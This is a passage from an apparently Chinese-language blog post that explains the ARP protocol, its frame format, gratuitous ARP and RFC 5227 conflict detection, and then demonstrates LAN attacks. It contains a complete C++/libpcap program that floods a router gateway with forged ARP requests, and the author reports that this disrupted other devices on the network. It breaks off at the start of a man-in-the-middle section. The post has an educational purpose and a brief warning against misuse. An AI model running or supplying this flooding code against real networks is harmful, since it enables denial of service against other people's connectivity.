        <content type="html"><![CDATA[<blockquote><p>​ARP（Address Resolution Protocol，地址解析协议），是一种将IP地址和以太网MAC地址（物理地址）连接起来的协议。在<strong>局域网</strong>中，当主机或其他网络设备有数据要发送给另一个主机或设备时，仅仅知道对方的IP地址是不够的，因为IP数据报文必须封装成帧才能通过物理链路发送。因此发送方还需要有下一跳的物理MAC地址，也就需要一个从IP地址到物理地址的映射。</p></blockquote><h2 id="ARP报文格式"><a href="#ARP报文格式" class="headerlink" title="ARP报文格式"></a>ARP报文格式</h2><p>​在TCP&#x2F;IP模型中，ARP协议属于网络层，在OSI模型中ARP协议属于链路层，从功能来看，它则是连接IP地址和MAC地址的桥梁，并在局域网的路由过程中起到了至关重要的作用。无论是主机或是交换机内部都有一张ARP缓存表，记录着邻居主机或网关的IP地址及MAC地址的映射，ARP表分为动态ARP表项和静态ARP表项，静态表项通过手动配置更新，而动态表项通过自学习更新，并设有老化时间（RFC1122中规定一般20分钟）。以下是动态ARP自学习的大致流程：</p><ol><li>若主机A想向主机B发送数据包Package，A首先会查看自己的ARP缓存表，确定是否包含有主机B的IP地址及对应的MAC地址表项。</li><li>若有，则主机A直接利用ARP表中的MAC地址对IP数据报进行帧封装，并将数据报发送给主机B；若没有，则A会以广播方式发送一个ARP请求报文，该报文会被局域网内所有主机收到。若某主机发现该ARP请求报文是查询自己的MAC地址，则会以单播方式向主机A回应一个ARP响应报文，应答报文中就包含了自己的MAC地址。如果发现不是自己的，就忽略并丢弃该报文。</li><li>而主机A在收到来自目标主机B的ARP响应报文后，会将B的MAC地址加入到自己的ARP缓存表中方便下次直接使用，然后填充数据包Package并发送出去。</li></ol><blockquote><p>值得注意的是，若主机B位于局域网内，则主机A会按上述流程广播请求B的MAC地址；但假若主机B位于该局域网外，则A需要查询的则是网关的MAC地址而不是B的MAC地址，因为Package的下一跳是网关。</p></blockquote><p><img src="https://s2.loli.net/2023/08/20/DbF1nzhfpC3H4eB.jpg" alt="networks.jpg"></p><p>​ARP的报文长度28个字节，包含8个字节的报头以及20个字节的地址四元组。如下图所示：</p><p><img src="https://s2.loli.net/2023/08/20/buwDEK6eIMGR9lU.png" alt="image.png"></p><ul><li>硬件类型：通常取1，表示以太网络。（也有其他的例如IEEE 802网络：6，ATM网络：37，等）</li><li>上层协议类型：通常是IPv4，值为0x0800</li><li>硬件地址长度：以太网中为6（字节）</li><li>协议长度：IPv4长度为4（字节）</li><li>操作码（Opcode）类型：ARP 请求为 1，ARP 响应为 2，RARP 请求为 3，RARP 响应为 4（RARP：反向地址转换协议，允许局域网的物理机器从网关服务器的 ARP 表或者缓存上请求其 IP 地址）。</li></ul><p>​ARP是个独立的三层协议，不需要IP协议封装。在第二层数据链路层封装的过程中，会在ARP报文的前面加上14字节的以太网帧头，以及若干字节的PAD填充和4字节的冗余校验码（FCS）结尾。以太网中最小帧长度为64字节，若不足64字节则PAD字段会以0填充，而校验码则用于检验数据传输是否出现损坏。</p><p><img src="https://s2.loli.net/2023/08/20/hziDHbg1VdJOpSv.jpg" alt="arp帧.jpg"></p><p>​我们通过wireshark抓包也可以很清晰地看到整个ARP报文的格式：（省略了帧尾的PAD和FCS字段）<img src="https://s2.loli.net/2023/08/20/Yj6ndSoOKpPcxJF.png" alt="image.png"></p><p>​我们前面提到，ARP操作码里，1表示请求报文，2表示响应报文。通常ARP的请求报文是广播请求（因为不知道该IP对应哪台设备，因此需要在局域网内广播），而响应是单播响应。广播请求的ARP帧目的地址会被填充成<strong>FF-FF-FF-FF-FF-FF</strong>，并且在ARP报文里的Target MAC address会置为0，如下图一所示。而响应报文里的Sender MAC address则说明了被查询主机的MAC地址，如图二所示。<img src="https://s2.loli.net/2023/08/20/gDHSh2Aclkfu3Vt.png" alt="image.png"><img src="https://s2.loli.net/2023/08/20/8qwXEFLUKypngS7.png" alt="image.png"></p><p>​除此之外，还有一种比较特殊的报文：Gratuitous ARP，它属于广播请求报文的范畴，而特殊性在于它的Sender MAC address等于Target MAC address，如下图所示，它可能有以下一些作用：</p><ul><li>该类型报文起到一个宣告作用。它以广播的形式将该数据包昭告大家，不需要得到回应，只为了告诉局域网内其他计算机自己的 IP 地址和 MAC 地址。</li><li>可用于检测 IP 地址冲突。当一台主机发送了Gratuitous ARP 请求报文后，如果收到了 ARP 响应报文，则说明网络内已经存在使用该 IP 地址的主机。</li><li>可用于更新其他主机的 ARP 缓存表。如果该主机更换了网卡，而其他主机的 ARP 缓存表仍然保留着原来的 MAC 地址。这时，可以发送Gratuitous ARP 数据包。其他主机收到该数据包后，将更新 ARP 缓存表，将原来的 MAC 地址替换为新的 MAC 地址。</li></ul><p><img src="https://s2.loli.net/2023/08/20/4UrgdEsVyIntBzc.png" alt="Gratuitous ARP.png"></p><p>​尽管Gratuitous ARP可用于检测地址冲突，但规范并没有给出相应手段去解决冲突，为此，2008年发行的RFC5227提出了一个机制：ACD（Address Conflict Detection，地址冲突检测）。这里提出两种比较特殊的ARP请求报文：ARP probe以及ARP announcement，同样的，它们都属于广播请求报文，即Opcode均为1。</p><p>​ARP probe 主要用于网卡刚上线时检测某个IP地址是否有设备占用。它有一个自己想要占用的候选IP地址，并放在ARP包的Target IP address里，而 Sender IP address会填充为0，这是是为了避免对其他主机的ARP cache造成污染（因为可能已经有主机正在使用该候选IP地址了；</p><p>​而 ARP announcement 则用于在选定某个IP地址后，昭示整个局域网（LAN）：本机要使用该IP地址了。它的Sender IP address 等于Target IP address（也就是说结构和Gratuitous ARP一样）。</p><p>​ACD（Address Conflict Detection，地址冲突检测）的具体流程如下。</p><ol><li>当网卡启动时（或者从睡眠状态恢复，或者链接建立时）会发送一个ARP probe。（为了避免多个网卡同时启动同时发ARP probe造成拥塞，有一个拥塞避免策略，不会立刻发送ARP probe，单个网卡的多个probe也不会连续发送，会有间隔时间）。</li><li>发送主机可能收到ARP reply或者ARP probe，如果收到了ARP reply，说明该候选IP地址已经有主机在用了。如果收到了一个Target IP地址为候选IP的 ARP probe，说明另外一个主机也同时想要使用该候选IP地址。这种情况下，两个主机都会提醒用户出现了IP地址冲突。然后进行地址冲突处理。</li><li>如果上述两种ARP包都没有收到，说明候选IP地址可用。主机发送一个ARP announcement，告诉其他主机该候选IP本人占用，而这个ARP request会让LAN中其他主机更新自身的ARP cache。</li></ol><p>​地址冲突处理：《RFC5227》提供了三种可选的解决机制：1）放弃使用该IP地址。2）发送一个ARP announcement来进行IP地址“守卫”，如果冲突仍然继续存在，放弃使用这个IP。3）无视冲突，继续使用这个IP。</p><p>​当然，对于目前常见的通过DHCP动态获得IP地址的主机来说，通常并不需要在网卡启动时执行ACD过程。在某些手动静态配置IP或特殊网络配置中设备才有可能会使用ACD机制来避免相关冲突。以下是摘自RFC5227对于ACD提出背景的段落，感兴趣的同学可以点击原文了解 -&gt; <a href="https://www.rfc-editor.org/rfc/rfc5227">RFC 5227: IPv4 Address Conflict Detection (rfc-editor.org)</a> 或 <a href="https://rfc2cn.com/rfc5227.html">RFC5227: IPv4地址冲突检测 中文版</a>。</p><p>​Historically, accidentally configuring two Internet hosts with the same IP address has often been an annoying and hard-to-diagnose problem.</p><p>​This is unfortunate, because the existing Address Resolution Protocol (ARP) provides an easy way for a host to detect this kind of misconfiguration and report it to the user.  The DHCP specification [RFC2131] briefly mentions the role of ARP in detecting misconfiguration, as illustrated in the following three excerpts from RFC 2131:</p><ul><li>the client SHOULD probe the newly received address, e.g., with ARP</li><li>The client SHOULD perform a final check on the parameters (e.g., ARP for allocated network address)</li><li>If the client detects that the address is already in use (e.g., through the use of ARP), the client MUST send a DHCPDECLINE message to the server</li></ul><p>​Unfortunately, the DHCP specification does not give any guidance to implementers concerning the number of ARP packets to send, the interval between packets, the total time to wait before concluding that an address may safely be used, or indeed even which kinds of packets a host should be listening for, in order to make this determination. It leaves unspecified the action a host should take if, after concluding that an address may safely be used, it subsequently discovers that it was wrong. It also fails to specify what precautions a DHCP client should take to guard against pathological failure cases, such as a DHCP server that repeatedly OFFERs the same address, even though it has been DECLINEd multiple times.</p><p>​The authors of the DHCP specification may have been justified in thinking at the time that the answers to these questions seemed too simple, obvious, and straightforward to be worth mentioning, but unfortunately this left some of the burden of protocol design to each individual implementer. This document seeks to remedy this omission by clearly specifying the required actions.</p><h2 id="ARP内网攻击实践"><a href="#ARP内网攻击实践" class="headerlink" title="ARP内网攻击实践"></a>ARP内网攻击实践</h2><p>​ARP是建立在网络中各个主机互相信任的基础上的，它的诞生使得网络能够更加高效的运行，但也正因此所以存在安全缺陷。ARP协议无状态，只要某主机收到ARP响应包则会更新自己的ARP缓存表，而非只在自己发送过ARP请求才接收ARP应答。因此，攻击源可以主动伪造ARP响应包，并向局域网中其他设备或网关发送虚假的ARP信息，达到攻击的目的。</p><p><strong>「ARP攻击类型」</strong></p><ul><li><strong>ARP泛洪</strong>：攻击者向网关发送大量ARP包时造成网关cpu，内存压力增大，难以处理正常请求而导致整个网络拥塞甚至瘫痪。</li><li><strong>中间人攻击</strong>：当攻击者伪造一个这样的ARP响应包：记录着真实网关IP和虚假的MAC地址，并向局域网内目标设备不断发送，这会造成该设备内ARP缓存的网关MAC地址被篡改，从而使得其发出的数据包被重定向到虚假MAC地址上。如果该MAC是不存在的地址，会造成目标设备断网；而如果该MAC是攻击者的MAC地址，那么目标设备会将本来发送给网关的数据包发送给攻击者，这样则会造成数据被攻击者监听。</li></ul><p>​接下来我们实践模拟一下ARP泛洪以及断网攻击。如果有安装Linux Kali发行版，可以利用其内置的 nmap、arpspoo 等渗透测试工具实现。当然也可以选择自己写ARP包进行攻击，我在这里就直接用C++写了，攻击目标是我自家的路由器和几台连接的手机平板设备。准备工具：Linux虚拟机，wireshark用于抓包分析。以下是整个流程的基本思路：</p><blockquote><p>注意：请勿将网络攻击非法用于公共网络等设施。</p></blockquote><ol><li>首先需要查明自身设备的以及网关的IP和MAC地址等基本信息。</li><li>直接向网关发送大量ARP request包造成网络拥塞（ARP泛洪）。</li><li>构造ARP request包扫描整个网络连接的设备，通过wireshark查看reply并记录下它们的IP及MAC地址。</li><li>构造伪造的ARP reply包向网络中存在的设备发起攻击（中间人攻击）。</li></ol><h3 id="（一）准备设备"><a href="#（一）准备设备" class="headerlink" title="（一）准备设备"></a>（一）准备设备</h3><p>​自己在vmware安装的Linux虚拟机网络连接默认应该是NAT模式，通过IP地址和抓包也可以很容易分析出来。我家路由器网关IP为192.168.31.1，物理机为192.168.31.47，而虚拟机Linux却是192.168.80.30，虚拟机向网关的数据包会经过物理机一层转换，因此我们需要首先把虚拟机的网络连接调整为桥接模式。虚拟机有以下三种网络模式：</p><p><strong>「虚拟机三种网络模式区别」</strong></p><ul><li><strong>NAT模式</strong>：宿主机通过NAT建立一层子网，宿主机则是该子网的网关，而<strong>虚拟机需访问互联网则要通过宿主机这个网关转发出去</strong>，从网络拓扑结构来看虚拟机网卡和宿主机网卡不在同一层次网络中。</li><li><strong>桥接模式</strong>：指宿主机物理网卡和虚拟网卡通过vmnet虚换交换机进行桥接，<strong>虚权网卡和物理网卡在网络拓扑图上处于同一网络，具有同等地位</strong>，因此虚拟机直接与路由器网关通信。由于我们需要攻击路由器网关以及网络内的其他设备，因此需要让虚拟机与其位于同一网络中，故选用桥接模式。</li><li><strong>Host-only模式</strong>：该模式下虚拟网络是一个全封闭的网络，它唯一能够访问的就是宿主机。Host-Only网络和NAT网络比较相似，不同的地方在于<strong>Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet</strong>。它的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。</li></ul><p>​NAT改桥接模式的细节这里就不过多介绍了，网络上有很多相关的文章。注意，IP地址需要手动设置，但不要和该网络内已被占用的IP冲突了，DNS不设置也没问题，我们实验不需要用到域名解析，当然如果你想让你的虚拟机能通过域名上网还是可以设置一下（可以设置成与物理机相同的DNS域名服务器）。修改完毕后这几个页面大概长这样：<img src="https://s2.loli.net/2023/08/22/ZSxzP2vkYdcJ34y.png" alt="image.png"></p><h3 id="ARP泛洪攻击"><a href="#ARP泛洪攻击" class="headerlink" title="ARP泛洪攻击"></a>ARP泛洪攻击</h3><p>​攻击代码使用C++完成，代码本身比较简单，只需要先定义好ARP结构体，然后根据ARP报文格式进行依次填充即可，最后再利用相关网络包发送的 pcap API 即可实现流程。对比前文提到的ARP帧格式，结构体如下，包含以太网帧头和ARP报文（不包含帧尾PAD和FCS）：<img src="https://s2.loli.net/2023/08/22/VdTrXESG5iKJqkZ.png" alt="image.png"></p><p>​总体代码如下所示，编译命令记得加 pacp 的动态链接：<code> g++ arp_req.cpp -lpcap</code>，运行命令需要管理员权限 <code> sudo ./a.out</code>，运行时需要选择虚拟机网卡，我这里是 ens33，可以通过 <code>ifconfig</code> 命令查看。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push) <span class="comment">// 保持对齐方式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)    <span class="comment">// 设定1位对齐</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者ip及mac地址</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *srcip = <span class="string">&quot;192.168.31.51&quot;</span>;</span><br><span class="line">u_char SRC_MAC[<span class="number">6</span>] = &#123;<span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x29</span>, <span class="number">0x3B</span>, <span class="number">0xBB</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 广播mac填充地址</span></span><br><span class="line">u_char BROADCAST_MAC[<span class="number">6</span>] = &#123;<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标设备ip及缺省mac地址</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *victim_ip = <span class="string">&quot;192.168.31.1&quot;</span>;</span><br><span class="line">u_char VICTIM_MAC[<span class="number">6</span>] = &#123;<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_eth_header</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dst_mac[<span class="number">6</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> src_mac[<span class="number">6</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> type;</span><br><span class="line">&#125; ETH_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_arp_header</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hardware_type;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> protocol_type;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> hardware_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> protocol_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> option;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> src_mac[<span class="number">6</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> src_ip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dst_mac[<span class="number">6</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> dst_ip;</span><br><span class="line">&#125; ARP_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_arp_packet</span></span><br><span class="line">&#123;</span><br><span class="line">    ETH_HEADER eth_header;</span><br><span class="line">    ARP_HEADER arp_header;</span><br><span class="line">&#125; ARP_PACKET;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitARPHeader</span><span class="params">(u_char *tmpBuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ARP_HEADER arp_header;</span><br><span class="line">    <span class="type">int</span> arpsize = <span class="built_in">sizeof</span>(ARP_HEADER);</span><br><span class="line"></span><br><span class="line">    arp_header.hardware_type = <span class="built_in">htons</span>(<span class="number">0x0001</span>);</span><br><span class="line">    arp_header.protocol_type = <span class="built_in">htons</span>(<span class="number">0x0800</span>);</span><br><span class="line">    arp_header.hardware_len = <span class="number">6</span>;</span><br><span class="line">    arp_header.protocol_len = <span class="number">4</span>;</span><br><span class="line">    arp_header.option = <span class="built_in">htons</span>(<span class="number">0x0001</span>); <span class="comment">// arp request</span></span><br><span class="line"></span><br><span class="line">    arp_header.src_ip = <span class="built_in">inet_addr</span>(srcip);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        arp_header.src_mac[i] = SRC_MAC[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// string ret = victim_ip + to_string(num);</span></span><br><span class="line">    <span class="comment">// arp_header.dst_ip = inet_addr(ret.c_str());</span></span><br><span class="line">    arp_header.dst_ip = <span class="built_in">inet_addr</span>(victim_ip);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        arp_header.dst_mac[i] = VICTIM_MAC[i];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">0</span>, &amp;arp_header.hardware_type, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">2</span>, &amp;arp_header.protocol_type, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">4</span>, &amp;arp_header.hardware_len, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">5</span>, &amp;arp_header.protocol_len, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">6</span>, &amp;arp_header.option, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">8</span>, &amp;arp_header.src_mac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">14</span>, &amp;arp_header.src_ip, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">18</span>, &amp;arp_header.dst_mac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">24</span>, &amp;arp_header.dst_ip, <span class="number">4</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">pcap_t</span> *fp;</span><br><span class="line">    <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">    u_char packet[<span class="number">42</span>];</span><br><span class="line">    <span class="type">pcap_if_t</span> *alldevs;</span><br><span class="line">    <span class="type">pcap_if_t</span> *d;</span><br><span class="line">    <span class="type">int</span> inum;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检测网卡 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pcap_findalldevs</span>(&amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Error in pcap_findalldevs: %s\n&quot;</span>, errbuf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 打印网卡 */</span></span><br><span class="line">    <span class="keyword">for</span> (d = alldevs; d; d = d-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d. %s&quot;</span>, ++i, d-&gt;name);</span><br><span class="line">        <span class="keyword">if</span> (d-&gt;description)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; (%s)\n&quot;</span>, d-&gt;description);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; (No description available)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNo interfaces found! Make sure WinPcap is installed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the interface number (1-%d):&quot;</span>, i);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;inum);</span><br><span class="line">    <span class="keyword">if</span> (inum &lt; <span class="number">1</span> || inum &gt; i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nInterface number out of range.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">pcap_freealldevs</span>(alldevs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 选择 */</span></span><br><span class="line">    <span class="keyword">for</span> (d = alldevs, i = <span class="number">0</span>; i &lt; inum - <span class="number">1</span>; d = d-&gt;next, i++)</span><br><span class="line">        ;</span><br><span class="line">    <span class="comment">/* 打开输出设备 */</span></span><br><span class="line">    <span class="keyword">if</span> ((fp = <span class="built_in">pcap_open_live</span>(d-&gt;name, <span class="comment">// name of the device</span></span><br><span class="line">                             <span class="number">65535</span>,   <span class="comment">// portion of the packet to capture.</span></span><br><span class="line">                             <span class="comment">// 65536 grants that the whole packet will be captured on all the MACs.</span></span><br><span class="line">                             <span class="number">1</span>,     <span class="comment">// promiscuous mode (nonzero means promiscuous)</span></span><br><span class="line">                             <span class="number">0</span>,     <span class="comment">// read timeout</span></span><br><span class="line">                             errbuf <span class="comment">// error buffer</span></span><br><span class="line">                             )) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nUnable to open the adapter. %s is not supported by WinPcap\n&quot;</span>, d-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open succeed!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把以太网头复制到缓冲区</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        packet[i] = BROADCAST_MAC[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">        packet[i] = SRC_MAC[i - <span class="number">6</span>];</span><br><span class="line">    packet[<span class="number">12</span>] = <span class="number">0x08</span>;</span><br><span class="line">    packet[<span class="number">13</span>] = <span class="number">0x06</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitARPHeader</span>(packet + <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 发送数据包 */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> k = <span class="number">0</span>; k &lt; <span class="number">1000000</span>; ++k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">pcap_sendpacket</span>(fp, (<span class="type">const</span> u_char *)&amp;packet, <span class="built_in">sizeof</span>(packet)) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nError sending the packet: %s\n&quot;</span>, <span class="built_in">pcap_geterr</span>(fp));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">usleep</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send succeed %lld times!\n&quot;</span>, ++count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​当按下命令的那一刻，虚拟机以每秒上千个 ARP request packet 的速率向网关发起了泛洪攻击，如下图所示，此时能够明显感受到网络中其他手机平板设备网络出现阻塞以及中断的现象。</p><p><img src="https://s2.loli.net/2023/08/22/tErosQqWnAbI1YZ.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/08/22/FQ9uCrmhBpSa3vK.jpg" alt="net.jpg"></p><h3 id="ARP中间人攻击"><a href="#ARP中间人攻击" class="headerlink" 